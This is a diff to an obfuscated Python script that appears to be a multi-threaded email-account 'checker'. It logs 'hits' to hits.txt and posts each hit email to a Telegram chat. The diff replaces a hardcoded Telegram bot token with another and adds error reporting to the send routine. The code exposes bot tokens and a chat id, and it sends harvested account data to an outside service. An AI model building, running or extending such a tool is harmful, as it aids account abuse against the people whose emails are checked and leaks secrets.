@@ -42,8 +42,7 @@ v_6y=.05
 v_6z=8
 v_7x=6
 v_7y=7
-# Changed path to local folder for Railway compatibility
-v_8x='hits.txt'
+v_8x='hits.txt'  # Railway ke liye local path
 v_9x=Lock()
 v_9y=Lock()
 v_9z=Lock()
@@ -57,8 +56,8 @@ v_12x='—'
 v_12y={}
 v_12z=Lock()
 
-# --- HARDCODED CREDENTIALS ---
-v_13x='8883575419:AAGyWUGVY-zjMkYSnTVStwp_0ek3j3tHgBs'
+# --- UPDATED CREDENTIALS ---
+v_13x='8855726336:AAGjdBDibZeizfrFaLNAeikOFl2GAeXN-p0'
 v_13y='8846085944'
 
 v_14x=queue.Queue()
@@ -137,8 +136,12 @@ def tg(email):
 	C={'inline_keyboard':[[{A:'🔴 𝐉ᴏɪɴ 🔴',B:v_1x},{A:'🔻 𝐃ᴇᴠᴇʟᴏᴘᴇʀ 🔻',B:v_2x}]]}
 	D=f"<b>🔴 𝐒𝐄𝐗 𝐇ɪᴛ 🔴</b>\n<b>🔻 𝐁ʏ 𝐑𝐈𝐒𝐇𝐈 🔻</b>\n\n<b>🔻 𝐌ᴀɪʟ</b> ➵ <code>{email}</code>\n<b>🔴 𝐂ʀᴇᴅɪᴛ</b> ➵ <b>@{v_2z}</b>\n\n<i>🔴 Enjoy your sex hit by RISHI! 🔴</i>"
 	E=f"{v_24x}{v_13x}{v_24y}";F={'chat_id':v_13y,A:D,'parse_mode':v_24z,'reply_markup':json.dumps(C)}
-	try:sess().post(E,json=F,timeout=15)
-	except Exception:0
+	try:
+		r = sess().post(E,json=F,timeout=15)
+		if r.status_code != 200:
+			print(f"\n[TG ERROR] {r.text}")
+	except Exception as e:
+		print(f"\n[TG ERROR] {e}")
 
 def draw():
 	if not v_9y.acquire(blocking=_C):return
@@ -146,7 +149,6 @@ def draw():
 		with v_9x:F,G,C,N,H=v_10y,v_10z,v_11x,v_11y,v_12x
 		D=time.time()-v_11z;O=C/D if D>0 else 0
 		
-		# MAIN LIVE PANEL + 5 BOTTOM BANNERS
 		K=f"""
 {P}╭────────────────────────────────╮
 {P}│  🔴 {M}𝐒 𝐄 𝐗   𝐂 𝐇 𝐄 𝐂 𝐊 𝐄 𝐑{M} 🔴  {P}│
@@ -243,12 +245,10 @@ def main():
 {M}   🔻 120 threads loading... 🔴{R}
 """)
 
-	# Start background threads
 	Thread(target=file_writer,daemon=_B).start()
 	Thread(target=tg_worker,daemon=_B).start()
 	Thread(target=loop_draw,daemon=_B).start()
 	
-	# Start 120 worker threads
 	for C in range(v_3x):Thread(target=worker,args=(C+1,),daemon=_B).start()
 	
 	try:
